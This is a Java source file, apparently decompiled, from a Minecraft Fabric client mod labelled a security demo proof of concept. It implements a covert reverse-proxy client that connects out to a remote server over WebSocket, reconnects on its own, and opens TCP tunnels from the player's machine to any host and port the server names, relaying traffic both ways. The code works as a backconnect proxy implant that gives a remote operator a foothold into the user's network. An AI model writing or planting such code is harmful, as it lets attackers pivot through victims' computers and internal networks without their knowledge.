package com.securitydemo.poc;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class ReverseProxyClient {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private final ExecutorService workers = Executors.newCachedThreadPool((r) -> {
      Thread t = new Thread(r, "security-demo-reverse-proxy");
      t.setDaemon(true);
      return t;
   });
   private final Map<Integer, Tunnel> tunnels = new ConcurrentHashMap();
   private final AtomicBoolean running = new AtomicBoolean(false);
   private volatile RelaySocket socket;
   private volatile String sessionId;
   private volatile String proxyToken;

   void start(String serverBase, String sessionId, String proxyToken) {
      if (!this.running.getAndSet(true)) {
         this.sessionId = sessionId;
         this.proxyToken = proxyToken;
         this.workers.execute(() -> this.connectLoop(serverBase));
      }
   }

   void stop() {
      this.running.set(false);
      RelaySocket ws = this.socket;
      this.socket = null;
      if (ws != null) {
         ws.close();
      }

      for(Tunnel tunnel : this.tunnels.values()) {
         tunnel.closeQuietly();
      }

      this.tunnels.clear();
   }

   private void connectLoop(String serverBase) {
      for(long backoffMs = 3000L; this.running.get(); backoffMs = Math.min(backoffMs * 2L, 30000L)) {
         try {
            this.connectOnce(serverBase);
            backoffMs = 3000L;

            while(this.running.get()) {
               RelaySocket ws = this.socket;
               if (ws == null || !ws.isOpen()) {
                  break;
               }

               sleep(5000L);
            }
         } catch (Exception e) {
            LOGGER.warn("Reverse proxy offline: {}", e.getMessage());
         }

         RelaySocket ws = this.socket;
         this.socket = null;
         if (ws != null) {
            ws.close();
         }

         if (!this.running.get()) {
            break;
         }

         sleep(backoffMs);
      }

   }

   private void connectOnce(String serverBase) throws IOException {
      String wsBase = serverBase.replace("https://", "wss://").replace("http://", "ws://");
      String path = "/ws/proxy/" + this.sessionId + "?token=" + this.proxyToken;
      URI uri = URI.create(wsBase + path);
      RelaySocket ws = RelaySocket.connect(uri, new ProxySocketHandler(), 10000);
      this.socket = ws;
      LOGGER.info("Reverse proxy WebSocket open for session {}", this.sessionId);
   }

   private void handleFrame(byte[] data) {
      if (data != null && data.length >= 5) {
         int cmd = data[0] & 255;
         int connId = readUInt32(data, 1);
         if (cmd == 1) {
            if (data.length >= 7) {
               int addrLen = (data[5] & 255) << 8 | data[6] & 255;
               if (data.length >= 7 + addrLen) {
                  String target = new String(data, 7, addrLen, StandardCharsets.UTF_8);
                  this.workers.execute(() -> this.openTunnel(connId, target));
               }
            }
         } else if (cmd == 2) {
            Tunnel tunnel = (Tunnel)this.tunnels.get(connId);
            if (tunnel != null && data.length > 5) {
               tunnel.write(data, 5, data.length - 5);
            }
         } else {
            if (cmd == 3) {
               Tunnel tunnel = (Tunnel)this.tunnels.remove(connId);
               if (tunnel != null) {
                  tunnel.closeQuietly();
               }
            }

         }
      }
   }

   private void openTunnel(int connId, String target) {
      String host = target;
      int port = 80;
      int colon = target.lastIndexOf(58);
      if (colon > 0 && colon < target.length() - 1) {
         host = target.substring(0, colon);

         try {
            port = Integer.parseInt(target.substring(colon + 1));
         } catch (NumberFormatException var10) {
            this.sendConnectFail(connId);
            return;
         }
      }

      Socket tcp = new Socket();
      Tunnel tunnel = new Tunnel(connId, tcp);
      this.tunnels.put(connId, tunnel);

      try {
         tcp.connect(new InetSocketAddress(host, port), 15000);
         tcp.setTcpNoDelay(true);
         this.sendConnectOk(connId);
         this.startReader(tunnel);
      } catch (IOException var9) {
         this.tunnels.remove(connId);
         tunnel.closeQuietly();
         this.sendConnectFail(connId);
      }

   }

   private void startReader(Tunnel tunnel) {
      this.workers.execute(() -> {
         byte[] buf = new byte[16384];

         try {
            InputStream in = tunnel.socket.getInputStream();

            int read;
            while(this.running.get() && (read = in.read(buf)) >= 0) {
               if (read != 0) {
                  this.sendData(tunnel.connId, buf, read);
               }
            }
         } catch (IOException var8) {
         } finally {
            this.tunnels.remove(tunnel.connId);
            tunnel.closeQuietly();
            this.sendClose(tunnel.connId);
         }

      });
   }

   private void sendConnectOk(int connId) {
      ByteBuffer frame = ByteBuffer.allocate(5);
      frame.put((byte)4);
      putUInt32(frame, connId);
      this.sendBinary(frame.array());
   }

   private void sendConnectFail(int connId) {
      ByteBuffer frame = ByteBuffer.allocate(5);
      frame.put((byte)5);
      putUInt32(frame, connId);
      this.sendBinary(frame.array());
   }

   private void sendData(int connId, byte[] chunk, int length) {
      ByteBuffer frame = ByteBuffer.allocate(5 + length);
      frame.put((byte)2);
      putUInt32(frame, connId);
      frame.put(chunk, 0, length);
      this.sendBinary(frame.array());
   }

   private void sendClose(int connId) {
      ByteBuffer frame = ByteBuffer.allocate(5);
      frame.put((byte)3);
      putUInt32(frame, connId);
      this.sendBinary(frame.array());
   }

   private void sendBinary(byte[] frame) {
      RelaySocket ws = this.socket;
      if (ws != null && ws.isOpen()) {
         ws.sendBinary(frame);
      }

   }

   private static int readUInt32(byte[] data, int offset) {
      return (data[offset] & 255) << 24 | (data[offset + 1] & 255) << 16 | (data[offset + 2] & 255) << 8 | data[offset + 3] & 255;
   }

   private static void putUInt32(ByteBuffer buffer, int value) {
      buffer.put((byte)(value >>> 24 & 255));
      buffer.put((byte)(value >>> 16 & 255));
      buffer.put((byte)(value >>> 8 & 255));
      buffer.put((byte)(value & 255));
   }

   private static void sleep(long ms) {
      try {
         Thread.sleep(ms);
      } catch (InterruptedException var3) {
         Thread.currentThread().interrupt();
      }

   }

   @Environment(EnvType.CLIENT)
   private final class ProxySocketHandler implements RelaySocket.Listener {
      public void onOpen(RelaySocket ignored) {
      }

      public void onText(String message) {
      }

      public void onBinary(byte[] data) {
         ReverseProxyClient.this.handleFrame(data);
      }

      public void onClose(int code, String reason) {
         ReverseProxyClient.LOGGER.warn("Reverse proxy WebSocket closed {} {}", code, reason);
         ReverseProxyClient.this.socket = null;
      }

      public void onError(Throwable error) {
         ReverseProxyClient.LOGGER.warn("Reverse proxy WebSocket error", error);
         ReverseProxyClient.this.socket = null;
      }
   }

   @Environment(EnvType.CLIENT)
   private static final class Tunnel {
      private final int connId;
      private final Socket socket;

      private Tunnel(int connId, Socket socket) {
         this.connId = connId;
         this.socket = socket;
      }

      private void write(byte[] data, int offset, int length) {
         try {
            OutputStream out = this.socket.getOutputStream();
            out.write(data, offset, length);
            out.flush();
         } catch (IOException var5) {
         }

      }

      private void closeQuietly() {
         try {
            this.socket.close();
         } catch (IOException var2) {
         }

      }
   }
}
